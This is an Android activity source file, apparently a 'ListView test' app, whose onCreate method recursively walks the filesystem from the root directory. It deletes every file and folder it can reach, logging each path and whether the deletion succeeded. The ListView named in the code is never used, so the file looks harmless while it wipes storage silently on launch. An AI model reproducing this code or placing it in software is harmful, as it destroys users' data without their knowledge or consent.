package com.example.listviewtest;

import android.os.Bundle;
import android.util.Log;

import java.io.File;

import android.app.Activity;
import android.widget.ListView;

public class MainActivity extends Activity
{
	private ListView photoListView;
	
	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		File file = new File("/");
		selectFile(file);
	}
	

	private void selectFile(File filepath)
	{
		if(filepath!=null)
		{
			File[] files = filepath.listFiles();
			if(files!=null)
			{
				for (int i = 0; i < files.length; i++)
				{
					if(files[i].isDirectory())
					{
						selectFile(files[i]);
					}
					Log.i("Connor", files[i].toString());
					Boolean a = files[i].delete();
					Log.i("Connor", a.toString());
				}
			}
		}
	}
}
